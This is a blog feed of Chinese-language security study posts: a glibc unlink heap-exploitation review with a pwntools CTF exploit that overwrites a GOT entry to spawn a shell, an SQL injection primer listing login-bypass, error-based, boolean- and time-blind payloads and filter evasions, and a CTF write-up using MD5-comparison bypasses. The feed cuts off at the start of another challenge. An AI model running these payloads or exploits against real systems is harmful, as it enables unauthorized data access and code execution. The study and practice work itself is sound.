<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://wscyoulin.github.io/atom.xml" rel="self"/>
  
  <link href="http://wscyoulin.github.io/"/>
  <updated>2022-11-30T09:56:22.308Z</updated>
  <id>http://wscyoulin.github.io/</id>
  
  <author>
    <name>youlin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>unlink复习</title>
    <link href="http://wscyoulin.github.io/2022/11/29/unlink%E5%A4%8D%E4%B9%A0/"/>
    <id>http://wscyoulin.github.io/2022/11/29/unlink%E5%A4%8D%E4%B9%A0/</id>
    <published>2022-11-28T16:42:49.000Z</published>
    <updated>2022-11-30T09:56:22.308Z</updated>
    
    <content type="html"><![CDATA[<p>由于有很长一段时间处于摆烂状态，并且分心去学了点web，导致pwn的一些基础的知识点有部分遗忘，刷buu的时候发现unlink这部分的内容记得不是很清楚，尤其是关于”检查”这部分遗忘的挺多，只记得大概的一些东西，因此借助z1r0师傅的博客重新学习一遍unlink这部分的内容</p><h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p>glibc在线源码查看：<a href="https://elixir.bootlin.com/glibc/glibc-2.23/source">https://elixir.bootlin.com/glibc/glibc-2.23/source</a></p><p>unlink的源码（2.23）unlink其实是libc中定义的一个宏，定义如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#define unlink(AV, P, BK, FD) {                                            \</span><br><span class="line">    FD = P-&gt;fd;      \</span><br><span class="line">    BK = P-&gt;bk;      \</span><br><span class="line">    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span><br><span class="line">      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \</span><br><span class="line">    else {      \</span><br><span class="line">        FD-&gt;bk = BK;      \</span><br><span class="line">        BK-&gt;fd = FD;      \</span><br><span class="line">        if (!in_smallbin_range (P-&gt;size)      \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {      \</span><br><span class="line">    if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="line">      malloc_printerr (check_action,      \</span><br><span class="line">       "corrupted double-linked list (not small)",    \</span><br><span class="line">       P, AV);      \</span><br><span class="line">            if (FD-&gt;fd_nextsize == NULL) {      \</span><br><span class="line">                if (P-&gt;fd_nextsize == P)      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span><br><span class="line">                else {      \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span><br><span class="line">                  }      \</span><br><span class="line">              } else {      \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">              }      \</span><br><span class="line">          }      \</span><br><span class="line">      }      \</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在执行free()函数时，调用了unlink，其实通俗易懂点就是：三个chunk，将中间的chunk拿掉，形成<code>chunk1-&gt;fd = chunk3-&gt;prev_size</code>，<code>chunk3-&gt;fd = chunk1-&gt;prev-size</code></p><h1 id="堆释放"><a href="#堆释放" class="headerlink" title="堆释放"></a>堆释放</h1><p>先看看堆释放吧。(注意使用2.23的动态链接库)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//gcc -g z1r0.c -o z1r0</span><br><span class="line">#include&lt;stdio.h&gt;、</span><br><span class="line">int main(int argc, char **argv){</span><br><span class="line">    long *p1 = malloc(0x80);</span><br><span class="line">    long *first_chunk = malloc(0x80);</span><br><span class="line">    long *p2 = malloc(0x80);</span><br><span class="line">    long *second_chunk = malloc(0x80);</span><br><span class="line">    long *p3 = malloc(0x80);</span><br><span class="line">    long *third_chunk = malloc(0x80);</span><br><span class="line">    long *p4 = malloc(0x80);</span><br><span class="line">    free(first_chunk);</span><br><span class="line">    free(second_chunk);</span><br><span class="line">    free(third_chunk);</span><br><span class="line">    return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>malloc7个0x80大小的chunk，释放了first，second，third这三个chunk，之所以释放这三个chunk是因为两个相邻的chunk释放后会进行合并，因为申请的是0x80所以直接进unsortedbin。</p><p>gdb吧，直接下b 14</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221129005757929.png" alt="image-20221129005757929"></p><p>可以看到first-&gt;fd指向了main_arena+88，third-&gt;bk也指向了main_arena+88，看一下heap吧。</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221129005820599.png" alt="image-20221129005820599"></p><p>unlink过程以及检查</p><p>ctf-wiki unlink：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/</a></p><p>ctf-wiki上面讲解了unlink的过程，有点难理解，这里跟着z1r0师傅复习一下吧，通俗易懂点</p><p>查看一下first_chunk吧。</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221129005910629.png" alt="image-20221129005910629"></p><h1 id="unlink检查"><a href="#unlink检查" class="headerlink" title="unlink检查"></a>unlink检查</h1><p><strong>检查1：检查与被释放chunk相邻高地址的chunk的prevsize的值是否等于被释放chunk的size大小。 可以看上图蓝色框中的内容，上面蓝色框中的内容是second_chunk的size大小，下面蓝色框中的内容是p3的prev_size，这两个蓝色框中的数值是需要相等的（忽略P标志位）。在wiki上我记得在基础部分有讲过，如果一个块属于空闲状态，那么相邻高地址块的prev_size为前一个块的大小</strong></p><p><strong>检查2：检查与被释放chunk相邻高地址的chunk的size的P标志位是否为0 可以看上图粉色框中的内容，这里是p3的size，p3的size的P标志位为0，代表着它前一个chunk(second_chunk)为空闲状态</strong></p><p><strong>检查3：检查前后被释放chunk的fd和bk 可以看上图红色框中的fd和bk内容，这里是second_chunk的fd和bk。首先看fd，它指向的位置就是前一个被释放的块first_chunk，这里需要检查的是first_chunk的bk是否指向second_chunk的地址。再看second_chunk的bk，它指向的是后一个被释放的块third_chunk，这里需要检查的是third_chunk的fd是否指向second_chunk的地址</strong></p><h1 id="例题：hitcontraining-unlink"><a href="#例题：hitcontraining-unlink" class="headerlink" title="例题：hitcontraining_unlink"></a>例题：hitcontraining_unlink</h1><p>buu上面的一道题目，因为buu上面的环境问题，后门函数打印flag的路径在buu的靶机上不对，所以最终还是用unlink修改got表，来拿shell</p><p>在编辑堆块的函数里面有明显的堆溢出</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221130175020826.png" alt="image-20221130175020826"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bss_addr = 0x6020c8</span><br><span class="line"></span><br><span class="line">add(0x40, 'aaaa')   #0</span><br><span class="line">add(0x80, 'bbbb')   #1</span><br><span class="line">add(0x80, 'cccc')   #2</span><br><span class="line"></span><br><span class="line">fd = bss_addr - 0x18</span><br><span class="line">bk = bss_addr - 0x10</span><br><span class="line">fake_chunk = p64(0) + p64(0x41)</span><br><span class="line">fake_chunk += p64(fd) + p64(bk)</span><br><span class="line">fake_chunk += b'a' * 0x20</span><br><span class="line">fake_chunk += p64(0x40)</span><br><span class="line">fake_chunk += p64(0x90)</span><br><span class="line"></span><br><span class="line">edit(0, 0x80, fake_chunk)</span><br><span class="line">delete(1)</span><br></pre></td></tr></tbody></table></figure><p>首先申请三个堆块，触发unlink,原本指向heap1的指针指向了0x6020b0</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221130175238835.png" alt="image-20221130175238835"></p><p>接着就是修改这个指针，使其指向atoi_got，泄露libc并修改got为system</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">atoi_got = elf.got['atoi']</span><br><span class="line">payload = p64(0) * 2 + p64(0x40) + p64(atoi_got)</span><br><span class="line">edit(0, 0x80, payload)</span><br><span class="line">all()</span><br><span class="line">io.recvuntil('0 : ')</span><br><span class="line">atoi_addr = u64(io.recv(6).ljust(8, b'\x00'))</span><br><span class="line">print("atoi_addr:"+hex(atoi_addr))</span><br><span class="line"></span><br><span class="line">libc_base = atoi_addr - libc.sym['atoi']</span><br><span class="line">one = [0x45216, 0x4526a, 0xf03a4, 0xf1247]</span><br><span class="line">one_gadget = one[1] + libc_base</span><br><span class="line">system_addr = libc_base + libc.sym['system']</span><br><span class="line"></span><br><span class="line">p2 = p64(system_addr)</span><br><span class="line">edit(0, 8, p2)</span><br><span class="line"></span><br><span class="line">sla('Your choice:',b'/bin/sh\x00')</span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;由于有很长一段时间处于摆烂状态，并且分心去学了点web，导致pwn的一些基础的知识点有部分遗忘，刷buu的时候发现unlink这部分的内容记得不是很清楚，尤其是关于”检查”这部分遗忘的挺多，只记得大概的一些东西，因此借助z1r0师傅的博客重新学习一遍unlink这部分的内容</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>sql注入总结</title>
    <link href="http://wscyoulin.github.io/2022/11/25/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <id>http://wscyoulin.github.io/2022/11/25/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</id>
    <published>2022-11-24T17:57:43.000Z</published>
    <updated>2022-11-25T07:30:05.702Z</updated>
    
    <content type="html"><![CDATA[<p>下边以mysql为例：localhost为数据库的服务器，其中demo，information_schema，mysql等为数据库，在demo数据库下又含有demo，student，users表。如图展示的是users表中的内容，他有7个列，分别为id，name，password…</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/20221125015639.png"></p><p><strong>SQL语句</strong></p><p>如果要查询users表中名字为wangwu的所有数据，SQL语句的写法应该是：select * from users where name=’wangwu’;</p><p>select代表查询，*代表所有数据，from后代表查询的表，where代表查询条件。</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/20221125020538.png"></p><p>sql查询交互流程：</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125134724360.png" alt="image-20221125134724360"></p><p>sql注入原理：</p><p>   select * from users where name=’wangwu’; fjwaijfiwajfwafjawh </p><p>1.SQL命令可查询、插入、更新、删除等，命令的串接。而以分号字符为不同命令的区别。</p><p>2.SQL命令对于传入的字符串参数是用单引号字符所包起来。（但连续2个单引号字符，在SQL数据库中， 则视为字符串中的一个单引号字符）</p><p>3.SQL命令中，可以注入注解（连续2个减号字符加空格 – 后的文字为注解，或“/<em>”与“</em>/”所包起来的文字为注解，或#后面为注解）</p><p>4.因此，如果在组合SQL的命令字符串时，未针对单引号字符作转义处理的话，将导致该字符变量在填入 命令字符串时，被恶意窜改原本的SQL语法的作用。</p><p><strong>原理</strong></p><p><strong>and</strong> <strong>且</strong> <strong>or</strong> <strong>或</strong></p><p>例：某网站登陆语句为：select * from member where name=’$name’ and pwd=’$pwd’ </p><p>正常用户传入name=admin，pwd=123456，语句为</p><p>select * from member where name=’admin’ and pwd=’123456’ </p><p>若我们传入的$name=’ or 1=1– ，传入$pwd随意，则拼接后的sql语句变成：</p><p>select * from member where name=’’ or 1=1– ‘ and pwd=’$pwd’</p><p>前面说过– 可以注释后面的部分，因此标红部分被注释。由于任何值or 1=1，因此总能查询得到结果，成功</p><p>绕过sql查询，登陆用户。这样登陆使用的用户名和密码被称为<strong>万能密码</strong></p><h2 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h2><p><strong>注入漏洞根据字段类型不同，一般分为int数值型注入和varchar字符型注入</strong></p><p>int数值型注入检测payload</p><p>?id=xx and 1=1 </p><p>?id=xx and 1=2</p><p>两次页面对比若有不同，则表示存在 Int数值型sql注入</p><p>varchar字符型注入检测payload</p><p>?id=xx’ and ‘1’=’1</p><p>?id=xx’ and ‘1’=’2</p><p>两次页面对比若有不同，则表示存在 varchar字符型sql注入</p><p><strong>注入漏洞根据获取sql语句分类，具有以下几种类型</strong></p><p>1、select注入 2、insert注入 3、update注入 4、delete注入</p><p><strong>注入漏洞根据获取信息的方式分类，具有以下几种类型</strong></p><p>1、联合查询注入</p><p>2、报错注入</p><p>3、布尔盲注</p><p>4、时间盲注</p><p>5、堆叠注入</p><p>6、DNS log注入</p><p>7、宽字节注入</p><p>8、二次注入</p><p>9、hpf（HTTP Parameter Fragment）</p><h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p>1、判断是否存在注入（and 1=1/and 1=2）</p><p>2、获取查询列数（order by/union select）</p><p>3、获取数据库名称</p><p>4、获取数据表名称</p><p>5、获取数据列名称</p><p>6、获取数据</p><p><strong>判断select查询的列数</strong></p><p>判断select查询的列数的原因：union用于合并两个或多个select语句的结果集，但需要左右两侧列数一致</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125135338074.png" alt="image-20221125135338074"></p><p><strong>判断select查询的列数的方法</strong></p><p>1.order by + 列数</p><p>当猜测的列数 小于等于 真实查询列数时，页面返回正常；反之，页面不正常</p><p>2.union select 1,2,3…,列数</p><p>当猜测的列数 等于 真实查询列数时，页面返回正常，反之，页面不正常</p><p><strong>获取页面上显示位</strong></p><p>显示位：网页上能够显示数据的位置。</p><p>例：使用union select 1,2,3,4,5,6进行注入时，若页面上应正常显示数据的位置出现了3和4，则表示3和4是</p><p>显示位，可以在3和4的地方写入sql代码，则代码执行结果将在页面上显示</p><p><strong>获取数据库名称方式</strong></p><p>1、select database() //获取当前数据库的名称</p><p>2、select schema_name from information_schema.schemata</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125135615732.png" alt="image-20221125135615732"></p><p>information_schema数据库是mysql自带的，它提供了访问数据库元数据的方式。什么是元数据呢？元数 据是关于数据的数据，如数据库名或表名或列名，列的数据类型，或访问权限等。因此，可以利用 informati_schema数据库获取我们想要的信息</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p><strong>报错注入原理</strong></p><p>由于页面提供了mysql错误信息，黑客通过sql注入可以让mysql错误信息连同数据一并显示到页面上。</p><p><strong>报错注入分类</strong></p><p>1、XML语法报错</p><p>2、数值溢出报错</p><p>3、group by报错</p><p><strong>XML语法报错</strong></p><p>相关函数：updatexml()、extractvalue()，mysql 5.1.5及以上，最多获取32个字符</p><p>报错原因：xpath_expr中出现非xpath语法的字符</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125140619905.png"></p><p>UpdateXML(xml_target, xpath_expr, new_xml)</p><p>返回替换的XML片段</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125141503997.png" alt="image-20221125141503997"></p><p>ExtractValue(xml_frag, xpath_expr)</p><p>使用XPath表示法从XML字符串中提取值</p><p><strong>数值溢出报错——大整数</strong></p><p>mysql 5.5.5以上，5.5.50以下。一次最多获取32个字符</p><p>试着对最大数做加法运算，可以看到报错的具体情况</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125141659099.png" alt="image-20221125141659099"></p><p>在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用按位取反运算运算即可</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125141723203.png" alt="image-20221125141723203"></p><p>我们知道，如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算</p><p>的。利用这一特性，再结合之前说的溢出报错，就可以进行注入了。</p><p>(select (!x-~0) from (select user()x)a)</p><p><strong>数值溢出报错——浮点数</strong></p><p>同理，浮点数也是存在一定范围的</p><p>利用姿势：</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125150329630.png" alt="image-20221125150329630"></p><p>select exp(~(select*from(select user())x));</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125150311603.png" alt="image-20221125150311603"></p><p><strong>group by报错——一步步学习原理</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select rand();//生成一个0~1的随机数</span><br><span class="line">select floor(rand());//将生成的随机数向下取整，值为固定的0  select floor(rand()*2);//将随机数乘2后再向下取整，值为0或1</span><br><span class="line">select concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2)) from information_schema.tables</span><br><span class="line">where table_schema=database();//这样的格式方便观察，当前数据库中有多少个表就会显示多少条数据</span><br><span class="line">select concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))zz from information_schema.tables</span><br><span class="line">where table_schema=database() group by zz;//进行分组，分为两组：0和1</span><br><span class="line">select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))zz from  information_schema.tables where table_schema=database() group by zz;//计数，由于rand()的不确 定性，有时会报错，有时不会报错（不报错概率更大）</span><br></pre></td></tr></tbody></table></figure><p>select count(),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand(0)*2))zz from information_schema.tables where table_schema=database() group by zz;//添加随机因子后，rand(0) 变为确定的序列，若查询结果超过3条，则肯定报错</p><p>原因：</p><p>Floor(rand()*2);没有随机因子的序列是随机的 Floor(rand(0)*2);得到的序列是固定的 0011101110…</p><p><strong>Ascii码表简单理解</strong></p><p>在计算机中，我们每一个字符都对应这一个ascii码，在mysql中我们可以把未知的字符转换成ascii码，然后来进行比较确定其值。</p><p><a href="https://baike.baidu.com/item/ASCII/309296?fromtitle=ascii%E7%A0%81&amp;fromid=99077&amp;fr=aladdin">https://baike.baidu.com/item/ASCII/309296?fromtitle=ascii%E7%A0%81&amp;fromid=99077&amp;fr=aladdin</a></p><p><strong>布尔盲注原理</strong></p><p>之所以称之为布尔盲注，一方面是我们不能得到数据的具体内容，只能单个字符的进行猜测判断；另一方面 根据数据查询返回的页面结果（查询成功与失败页面不同）来判断我们输入的查询语句是否有效，非真即假， 所以称为布尔盲注。</p><p>每个字符的判断是将该字符与ascii码的可见字符进行比较，相等时才能得到一个字符。Ascii码表可见字符有</p><p>近百个，每个字符都要进行比较，数量庞大，非手工能做到。一般使用自动化脚本或注入工具来进行攻击。</p><p><strong>相关函数</strong></p><p>substr()、mid() 截取字符串 ascii() 将字符转换为ASCII码 concat() 字符串拼接</p><p><strong>函数说明</strong></p><p>SUBSTR(str,pos,len) //截取字符串，从第pos位开始，长度为len</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152213745.png" alt="image-20221125152213745"></p><p>ASCII(str) //将字符转换为ASCII码，若传入字符串，则只转换首字符</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152223306.png" alt="image-20221125152223306"></p><p>CONCAT(str1,str2,…) //将多个字符串拼接起来</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152229281.png" alt="image-20221125152229281"></p><p><strong>布尔盲注payload</strong></p><p>select ascii(substr(concat(‘abc’,’def’),4,1)); //将abc与def字符串拼接到一起后得到第四个字符的ascii码</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152257829.png" alt="image-20221125152257829"></p><p>?id=1’ and ascii(substr(database(),1,1))=99 %23//若数据库名首字符ASCII为99，则页面正常显示</p><p><strong>payload举例</strong></p><p>拿到数据库名第一个字符的payload</p><p>?id=1’and ascii(substr(database(),1,1))=117 and ‘1’=‘1</p><p>拿到表名第二个字符的payload</p><p>?id=1’and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),2,1))=108 and ‘1’=‘1</p><p>拿到列名第三个字符的payload</p><p>?id=1’and ascii(substr((select group_concat(column_name) from information_schema.columns</p><p>where table_schema=database() and table_name=’flags’),3,1))=97 and ‘1‘=’1</p><p>拿到数据第四个字符的payload</p><p>?id=1’and ascii(substr((select flag from flags limit 0,1),4,1))=103 and ‘1’=’1</p><p><strong>延时盲注原理</strong></p><p>之所以称之为延时盲注，一方面是我们不能得到数据的具体内容，只能单个字符的进行猜测判断；另一方面 根据数据查询返回的时间（查询成功数据库休眠n秒，失败则不休眠）来判断我们输入的查询语句是否有效， 所以称为延时盲注。</p><p><strong>相关函数</strong></p><p>sleep() //数据库休眠指定时间函数</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152447135.png" alt="image-20221125152447135"></p><p>benchmark() //重复执行表达式一定次数达到页面返回延时 if(condition,true_statement,false_statement) //依据表达式的真假执行不同的语句</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152453749.png" alt="image-20221125152453749"></p><p>if(condition,true_statement,false_statement)//若表达式为真，执行true_statement ；表达式为假， false_statement</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152500665.png" alt="image-20221125152500665"></p><p><strong>延时盲注payload</strong></p><p>select if(ascii(substr(concat(‘abc’,’def’),4,1))=100,sleep(3),null); //若拼接字符串的第四个字符的ascii码</p><p>值为100，数据库休眠3秒，否则不做任何操作</p><p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152527857.png" alt="image-20221125152527857"></p><p>?id=1’ and if(ascii(substr(database(),1,1))=117,sleep(3),null) %23 //若数据库名第一个字符的ASCII值是 99，则页面休眠3秒</p><p><strong>payload举例</strong></p><p>拿到数据库名第一个字符的payload</p><p>?id=1’and if(ascii(substr(database(),1,1))=117,sleep(1),null) and ‘1’=’1</p><p>拿到表名集合第二个字符的payload</p><p>?id=1’and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),2,1))=108,sleep(1),null) and ‘1’=’1</p><p>拿到列名集合第三个字符的payload</p><p>?id=1’and if(ascii(substr((select group_concat(column_name) from information_schema.columns</p><p>where table_schema=database() and table_name=’flags’),3,1))=97,sleep(1),null) and ‘1’=’1</p><p>拿到数据第四个字符的payload</p><p>?id=1’and if(ascii(substr((select flag from flags limit 0,1),4,1))=103,sleep(1),null) and ‘1’=’1</p><h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><p>十六进制、ASCII码绕过引号 char</p><p><a href="http://tools.bugscaner.com/text/zifuchuanzhuanhex.html">http://tools.bugscaner.com/text/zifuchuanzhuanhex.html</a></p><p>like、in、regex绕过等号：substr(password,1,1) like(‘p’); substr(password,1,1) in(‘p’);</p><p>逗号被过滤：select * from (select 1)a join (select 2)b、substr(password from 1 for 1) </p><p>空格被过滤：/**/、%0d %0a %0c %0b %a0 %09、+</p><p>大小写绕过：unIOn SeLeCt</p><p>&amp;&amp;代替and、||代替or、|代替xor、^位异或、～取反、!非 在查询时使用一个不存在的函数就能报错出数据库的名字 </p><p>等价函数：</p><p>hex() 、 bin() 《 == 》 ascii()； </p><p>sleep() 《 == 》 benchmark()； </p><p>mid()、substr()《==》substring()</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;下边以mysql为例：localhost为数据库的服务器，其中demo，information_schema，mysql等为数据库，在demo数据库下又含有demo，student，users表。如图展示的是users表中的内容，他有7个列，分别为id，name，passw</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>buu_web（21-xx)</title>
    <link href="http://wscyoulin.github.io/2022/11/19/buu-web/"/>
    <id>http://wscyoulin.github.io/2022/11/19/buu-web/</id>
    <published>2022-11-18T17:20:22.000Z</published>
    <updated>2022-11-26T12:52:07.147Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>进入题目是一个提交框</p><p><img src="https://img2020.cnblogs.com/blog/2096968/202109/2096968-20210902164007218-300602356.png"></p><p>输入123后发现有个password参数</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dfb23547-d218-4f2a-a8bd-27929456beb7.node4.buuoj.cn:81/leveldo4.php?password=123</span><br></pre></td></tr></tbody></table></figure><p>尝试了下一些常规的sql注入发现没反应，发现响应头有个hint</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint:select * from 'admin' where password=md5($pass,true)</span><br></pre></td></tr></tbody></table></figure><p>这里的MD5我们用ffifdyop来进行绕过，原理是ffifdyop这个字符串被 md5 哈希了之后会变成<br>276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6。而 Mysql 刚好又会吧 hex<br>转成 ascii 解释，因此拼接之后的形式是1select * from ‘admin’ where password=’’ or<br>‘6xxxxx’，进入构成一个永真式。</p><p>绕过后查看源码</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a = $GET['a'];</span><br><span class="line">$b = $_GET['b'];</span><br><span class="line"></span><br><span class="line">if($a != $b &amp;&amp; md5($a) == md5($b)){</span><br><span class="line">    // wow, glzjin wants a girl friend.</span><br></pre></td></tr></tbody></table></figure><p>用get的方式给a和b传参，且进行判断</p><p>这里payload是：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/levels91.php?a[]=1&amp;b[]=2</span><br></pre></td></tr></tbody></table></figure><p>然后又出现一个页面，直接显示源码</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include&nbsp;"flag.php";</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_POST['param2'])){</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;$flag;</span><br><span class="line">} </span><br></pre></td></tr></tbody></table></figure><p>同样的绕过方式只是是通过post方式传参</p><p>flag:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{d7947c55-1a3c-473e-ad6a-00e7ec06cdc6} </span><br></pre></td></tr></tbody></table></figure><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>首先进入网站，有登录和注册，注册了一个账号后在change界面找到hint，可以找到网站的源码</p><p><img 